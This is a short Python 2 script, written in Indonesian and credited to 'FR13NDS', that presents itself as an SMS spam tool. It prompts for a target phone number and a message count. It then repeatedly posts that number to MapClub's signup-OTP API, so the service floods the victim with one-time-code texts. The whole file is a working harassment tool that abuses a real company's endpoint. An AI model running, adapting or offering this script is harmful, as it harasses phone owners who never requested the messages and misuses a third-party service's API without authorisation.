# ~ OPEN SOURCE ~ 
# CODED BY FR13NDS
# FB : Andini amubia
import os
import sys
import time
import requests

def mulai():
    print
    print('\t\x1b[1;92m       [ \x1b[1;97mSPAM SMS MAPCLUB \x1b[1;92m]\x1b[1;97m')
    print('\t       <~~~~~~~~~~~~~~~~~~>')
    print('\t       Author : FR13NDS')
    print
    print ('( Ex : 0822*** )')
    Nomor = raw_input('Nomor Target : \x1b[1;92m')
    
    if len(Nomor) < 9:
         print
         print('\x1b[1;97m[\x1b[1;91m ! \x1b[1;97m] Nomor Invalid')
         time.sleep(1)
         os.system('clear')
         mulai()
    else:
         pass
    
    Nomor = int(Nomor) 
    
    print
    print ('\x1b[1;97m(Ex : 5)')
    Jumlah = input('Jumlah : \x1b[1;92m')
    if Jumlah > 15:
        print
        print('\x1b[1;97m[\x1b[1;91m !\x1b[1;97m ] Jangan terlalu banyak \nKalo Ga Mau Tools Ini Coid :v')
        print
        sys.exit()
    
    else:
        pass
    
    print
    print('Mulai Mengirim...')
    print
    MapClub(Nomor, Jumlah)

def MapClub(Nomor, Jumlah):
	for _ in range(Jumlah):

		time.sleep(5)
		headers = {
		'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
		'Referer' : 'https://mapclub.com/id/user/signup'
		}

		r = requests.post('https://cmsapi.mapclub.com/api/signup-otp', data = {'phone' : Nomor}, allow_redirects = True)

		if 'error' in r.text:
			print('\x1b[1;97m[\x1b[1;91m*\x1b[1;97m] Gagal Mengirim Sms Ke Nomor \x1b[1;92m' + str(Nomor))
		
		else:
			print('\x1b[1;97m[\x1b[1;92m*\x1b[1;97m] Berhasil Mengirim Sms Ke Nomor \x1b[1;92m' + str(Nomor))
			
if __name__ == '__main__':
    os.system('clear')
    mulai()
